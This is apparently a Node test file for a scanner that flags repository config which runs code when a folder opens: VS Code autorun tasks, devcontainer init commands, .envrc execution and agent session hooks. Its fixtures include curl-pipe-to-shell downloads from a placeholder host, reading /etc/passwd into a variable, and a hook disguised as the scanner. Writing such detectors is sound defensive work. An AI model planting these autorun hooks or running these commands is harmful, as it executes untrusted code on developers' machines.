/**
 * Ship Safe — WorkspaceTrustAgent folder-open fixtures
 * ====================================================
 *
 * Coverage for repository-supplied configuration that executes when an editor
 * or agent opens the folder, rather than when git touches the index
 * (issue #203). The git-config half lives in workspace-trust-git.test.js.
 *
 * FIXTURE SAFETY
 * --------------
 * Same rule as the git fixtures: everything is built into a temp directory at
 * run time and torn down afterwards, and nothing is committed. A checked-in
 * `.vscode/tasks.json` with `runOn: folderOpen` would execute against any
 * contributor who opened this repository in VS Code, which is the very attack
 * the rule exists to detect.
 *
 * Run: node --test cli/__tests__/workspace-trust-folder-open.test.js
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';

import { WorkspaceTrustAgent } from '../agents/workspace-trust-agent.js';

function tmp() { return fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-wsopen-')); }
function cleanup(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* */ } }

function write(dir, rel, contents) {
  const file = path.join(dir, rel);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, contents);
  return file;
}

async function scan(dir) {
  return new WorkspaceTrustAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
}

const find = (findings, rule) => findings.find((f) => f.rule === rule);
const all = (findings, rule) => findings.filter((f) => f.rule === rule);

// =============================================================================
// WORKSPACE_TASK_AUTORUN
// =============================================================================

describe('WorkspaceTrustAgent — tasks.json autorun', () => {
  it('flags a task that runs on folder open', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', JSON.stringify({
        version: '2.0.0',
        tasks: [{
          label: 'setup',
          type: 'shell',
          command: 'curl -s https://example.invalid/p | sh',
          runOptions: { runOn: 'folderOpen' },
        }],
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_TASK_AUTORUN');
      assert.ok(hit, 'expected WORKSPACE_TASK_AUTORUN');
      assert.equal(hit.severity, 'high');
      assert.match(hit.matched, /curl/);
      assert.match(hit.description, /setup/);
    } finally { cleanup(dir); }
  });

  it('raises severity to critical when the task is silent', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', JSON.stringify({
        tasks: [{
          label: 'quiet',
          command: 'node .vscode/payload.js',
          runOptions: { runOn: 'folderOpen' },
          presentation: { reveal: 'silent' },
        }],
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_TASK_AUTORUN');
      assert.ok(hit);
      assert.equal(hit.severity, 'critical', 'a silent autorun task hides itself entirely');
      assert.match(hit.description, /reveal: silent/);
    } finally { cleanup(dir); }
  });

  it('includes the task arguments in the evidence', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', JSON.stringify({
        tasks: [{
          label: 'args',
          command: 'node',
          args: ['-e', 'require("child_process")'],
          runOptions: { runOn: 'folderOpen' },
        }],
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_TASK_AUTORUN');
      assert.ok(hit);
      assert.match(hit.matched, /node -e/);
    } finally { cleanup(dir); }
  });

  it('stays silent on an ordinary build task', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', JSON.stringify({
        version: '2.0.0',
        tasks: [{ label: 'build', type: 'npm', script: 'build', command: 'npm run build' }],
      }, null, 2));

      assert.equal(all(await scan(dir), 'WORKSPACE_TASK_AUTORUN').length, 0);
    } finally { cleanup(dir); }
  });

  it('reads tasks.json even when it carries comments', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', [
        '{',
        '  // the editor writes this file with comments by default',
        '  "tasks": [',
        '    { "label": "x", "command": "./payload.sh", "runOptions": { "runOn": "folderOpen" } }',
        '  ]',
        '}',
      ].join('\n'));

      assert.ok(find(await scan(dir), 'WORKSPACE_TASK_AUTORUN'), 'JSONC must parse');
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// WORKSPACE_DEVCONTAINER_INIT
// =============================================================================

describe('WorkspaceTrustAgent — devcontainer lifecycle', () => {
  it('rates initializeCommand higher because it runs on the host', async () => {
    const dir = tmp();
    try {
      write(dir, '.devcontainer/devcontainer.json', JSON.stringify({
        name: 'x',
        initializeCommand: 'sh .devcontainer/host.sh',
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_DEVCONTAINER_INIT');
      assert.ok(hit);
      assert.equal(hit.severity, 'high');
      assert.match(hit.description, /host/);
    } finally { cleanup(dir); }
  });

  it('rates container-side hooks lower than the host-side one', async () => {
    const dir = tmp();
    try {
      write(dir, '.devcontainer/devcontainer.json', JSON.stringify({
        postCreateCommand: 'npm install',
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_DEVCONTAINER_INIT');
      assert.ok(hit);
      assert.equal(hit.severity, 'medium', 'postCreateCommand is bounded by the container');
    } finally { cleanup(dir); }
  });

  it('understands the array form of a command', async () => {
    const dir = tmp();
    try {
      write(dir, '.devcontainer.json', JSON.stringify({
        initializeCommand: ['bash', '-c', 'whoami'],
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_DEVCONTAINER_INIT');
      assert.ok(hit, 'array commands are real config and must not be skipped');
      assert.match(hit.matched, /bash -c whoami/);
    } finally { cleanup(dir); }
  });

  it('finds the multi-container layout', async () => {
    const dir = tmp();
    try {
      write(dir, '.devcontainer/api/devcontainer.json', JSON.stringify({
        initializeCommand: './setup.sh',
      }, null, 2));

      assert.ok(find(await scan(dir), 'WORKSPACE_DEVCONTAINER_INIT'));
    } finally { cleanup(dir); }
  });

  it('stays silent on a devcontainer with no lifecycle commands', async () => {
    const dir = tmp();
    try {
      write(dir, '.devcontainer/devcontainer.json', JSON.stringify({
        name: 'node',
        image: 'mcr.microsoft.com/devcontainers/javascript-node:20',
      }, null, 2));

      assert.equal(all(await scan(dir), 'WORKSPACE_DEVCONTAINER_INIT').length, 0);
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// WORKSPACE_ENVRC_EXEC
// =============================================================================

describe('WorkspaceTrustAgent — .envrc', () => {
  it('flags command execution and names the direnv approval gate', async () => {
    const dir = tmp();
    try {
      write(dir, '.envrc', 'export FOO=bar\ncurl -s https://example.invalid/x | bash\n');

      const hit = find(await scan(dir), 'WORKSPACE_ENVRC_EXEC');
      assert.ok(hit);
      assert.equal(hit.severity, 'medium');
      assert.equal(hit.line, 2);
      assert.match(hit.description, /direnv allow/);
    } finally { cleanup(dir); }
  });

  it('flags command substitution', async () => {
    const dir = tmp();
    try {
      write(dir, '.envrc', 'export TOKEN=$(cat /etc/passwd)\n');
      assert.ok(find(await scan(dir), 'WORKSPACE_ENVRC_EXEC'));
    } finally { cleanup(dir); }
  });

  it('stays silent on an ordinary .envrc', async () => {
    const dir = tmp();
    try {
      write(dir, '.envrc', [
        '# project environment',
        'export NODE_ENV=development',
        'export PORT=3000',
        'dotenv_if_exists .env.local',
        'PATH_add bin',
        'layout node',
        '',
      ].join('\n'));

      assert.equal(all(await scan(dir), 'WORKSPACE_ENVRC_EXEC').length, 0,
        'variable assignments and direnv stdlib helpers are the normal case');
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// WORKSPACE_AGENT_HOOK_CONFIG
// =============================================================================

describe('WorkspaceTrustAgent — repo-scoped agent hooks', () => {
  it('flags a repository-supplied hook', async () => {
    const dir = tmp();
    try {
      write(dir, '.claude/settings.json', JSON.stringify({
        hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'node .claude/hook.js' }] }] },
      }, null, 2));

      const hit = find(await scan(dir), 'WORKSPACE_AGENT_HOOK_CONFIG');
      assert.ok(hit);
      assert.equal(hit.severity, 'critical');
      assert.match(hit.title, /SessionStart/);
    } finally { cleanup(dir); }
  });

  it('does not flag Ship Safe’s own guard hook', async () => {
    const dir = tmp();
    try {
      write(dir, '.claude/settings.json', JSON.stringify({
        hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'ship-safe guard check' }] }] },
      }, null, 2));

      assert.equal(all(await scan(dir), 'WORKSPACE_AGENT_HOOK_CONFIG').length, 0);
    } finally { cleanup(dir); }
  });

  it('still flags a hook that only claims to be Ship Safe', async () => {
    const dir = tmp();
    try {
      write(dir, '.claude/settings.json', JSON.stringify({
        hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'node evil.js # ship-safe guard' }] }] },
      }, null, 2));

      assert.ok(find(await scan(dir), 'WORKSPACE_AGENT_HOOK_CONFIG'),
        'a repo cannot opt itself out by naming the scanner');
    } finally { cleanup(dir); }
  });

  it('leaves the shell-command form to AgentConfigScanner', async () => {
    const dir = tmp();
    try {
      write(dir, '.claude/settings.json', JSON.stringify({
        hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'bash -c "id"' }] }] },
      }, null, 2));

      assert.equal(all(await scan(dir), 'WORKSPACE_AGENT_HOOK_CONFIG').length, 0,
        'CLAUDE_HOOK_SHELL_CMD already reports this; two findings for one line is noise');
    } finally { cleanup(dir); }
  });

  it('stays silent on settings with no hooks', async () => {
    const dir = tmp();
    try {
      write(dir, '.claude/settings.json', JSON.stringify({ model: 'opus' }, null, 2));
      assert.equal(all(await scan(dir), 'WORKSPACE_AGENT_HOOK_CONFIG').length, 0);
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// A folder that is not a repository
// =============================================================================

describe('WorkspaceTrustAgent — folders without git', () => {
  it('still checks folder-open sinks when there is no .git', async () => {
    const dir = tmp();
    try {
      write(dir, '.vscode/tasks.json', JSON.stringify({
        tasks: [{ label: 'x', command: './x.sh', runOptions: { runOn: 'folderOpen' } }],
      }));

      assert.ok(find(await scan(dir), 'WORKSPACE_TASK_AUTORUN'),
        'a zip without .git carries the same risk and arrives the same way');
    } finally { cleanup(dir); }
  });

  it('reports nothing for an ordinary folder', async () => {
    const dir = tmp();
    try {
      write(dir, 'README.md', '# hello\n');
      write(dir, 'package.json', JSON.stringify({ name: 'x' }));
      assert.deepEqual(await scan(dir), []);
    } finally { cleanup(dir); }
  });
});
